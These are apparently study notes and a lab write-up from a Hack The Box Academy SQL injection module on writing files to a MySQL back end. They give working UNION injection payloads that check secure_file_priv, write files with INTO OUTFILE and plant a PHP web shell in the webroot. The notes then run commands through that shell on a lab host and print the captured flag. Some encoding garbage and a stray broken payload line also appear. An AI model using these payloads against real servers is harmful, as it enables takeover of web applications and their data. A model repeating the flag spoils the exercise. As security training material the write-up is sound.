---
sticker: lucide//database
---
When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.

---

## Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User withÂ `FILE`Â privilege enabled
2. MySQL globalÂ `secure_file_priv`Â variable not enabled
3. Write access to the location we want to write to on the back-end server

We have already found that our current user has theÂ `FILE`Â privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking theÂ `secure_file_priv`Â global variable.

#### secure_file_priv

TheÂ [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)Â variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand,Â `NULL`Â means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has theÂ `FILE`Â privilege. However,Â `MySQL`Â usesÂ `/var/lib/mysql-files`Â as the default folder. This means that reading files through aÂ `MySQL`Â injection isn't possible with default settings. Even worse, some modern configurations default toÂ `NULL`, meaning that we cannot read/write files anywhere within the system.

So, let's see how we can find out the value ofÂ `secure_file_priv`. WithinÂ `MySQL`, we can use the following query to obtain the value of this variable:


```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

However, as we are using aÂ `UNION`Â injection, we have to get the value using aÂ `SELECT`Â statement. This shouldn't be a problem, as all variables and most configurations' are stored within theÂ `INFORMATION_SCHEMA`Â database.Â `MySQL`Â global variables are stored in a table calledÂ [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columnsÂ `variable_name`Â andÂ `variable_value`.

We have to select these two columns from that table in theÂ `INFORMATION_SCHEMA`Â database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show theÂ `secure_file_priv`Â variable, using theÂ `WHERE`Â clause we learned about in a previous section.

The final SQL query is the following:

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

So, similar to otherÂ `UNION`Â injection queries, we can get the above query result with the following payload. Remember to add two more columnsÂ `1`Â &Â `4`Â as junk data to have a total of 4 columns':

\
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/33/secure_file_priv.jpg)

And the result shows that theÂ `secure_file_priv`Â value is empty, meaning that we can read/write files to any location.

---

## SELECT INTO OUTFILE

Now that we have confirmed that our user should write files to the back-end server, let's try to do that using theÂ `SELECT .. INTO OUTFILE`Â statement. TheÂ [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/)Â statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

To use it, we can addÂ `INTO OUTFILE '...'`Â after our query to export the results into the file we specified. The below example saves the output of theÂ `users`Â table into theÂ `/tmp/credentials`Â file:


```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

If we go to the back-end server andÂ `cat`Â the file, we see that table's content:


```shell-session
smoothment@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

It is also possible to directlyÂ `SELECT`Â strings into files, allowing us to write arbitrary files to the back-end server.


```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

When weÂ `cat`Â the file, we see that text:

```shell-session
smoothment@htb[/htb]$ cat /tmp/test.txt 

this is a test
```


```shell-session
smoothment@htb[/htb]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

As we can see above, theÂ `test.txt`Â file was created successfully and is owned by theÂ `mysql`Â user.

Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

---

## Writing Files through SQL Injection

Let's try writing a text file to the webroot and verify if we have write permissions. The below query should writeÂ `file written successfully!`Â to theÂ `/var/www/html/proof.txt`Â file, which we can then access on the web application:


```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

**Note:**Â To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to useÂ `load_file`Â to read the server configuration, like Apache's configuration found atÂ `/etc/apache2/apache2.conf`, Nginx's configuration atÂ `/etc/nginx/nginx.conf`, or IIS configuration atÂ `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, usingÂ [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)Â orÂ [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

TheÂ `UNION`Â injection payload would be as follows:

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/33/write_proof.png)

We donâ€™t see any errors on the page, which indicates that the query succeeded. Checking for the fileÂ `proof.txt`Â in the webroot, we see that it indeed exists:

Â Â Â 
![](https://academy.hackthebox.com/storage/modules/33/write_proof_text.png)

Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.

---

## Writing a Web Shell

Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:


```php
<?php system($_REQUEST[0]); ?>
```

We can reuse our previousÂ `UNION`Â injection payload, and change the string to the above, and the file name toÂ `shell.php`:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Â Â Â Â ', â€œ â€œ, â€œ â€œ into outfile '/var/www/html/shell.php'-- -'>

![](https://academy.hackthebox.com/storage/modules/33/write_shell.png)

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to theÂ `/shell.php`Â file and executing commands via theÂ `0`Â parameter, withÂ `?0=id`Â in our URL:
Â Â Â 

![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

The output of theÂ `id`Â command confirms that we have code execution and are running as theÂ `www-data`Â user.

# Question
---

![Pasted image 20250203154637.png](../../../../IMAGES/Pasted%20image%2020250203154637.png)

We can submit the following in order to get the webshell:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Now, we can go to `/shell.php` in the following way:

```r
http://83.136.248.110:40014/shell.php?0=id
```

![Pasted image 20250203154803.png](../../../../IMAGES/Pasted%20image%2020250203154803.png)

Now we got ourselves a webshell, let's try to look around for a flag, we can do this by using:

```r
find / -name '*.txt
```

We need to use URL encoding so:

```r
find+/+-name+'*.txt'+2>/dev/null
```

We'll see the following output:

![Pasted image 20250203155314.png](../../../../IMAGES/Pasted%20image%2020250203155314.png)

Flag is located at `/var/www/flag.txt`, let's read it using:

```
cat+/var/www/flag.txt
```

![Pasted image 20250203155402.png](../../../../IMAGES/Pasted%20image%2020250203155402.png)


Got the flag: `d2b5b27ae688b6a0f1d21b7d3a0798cd `
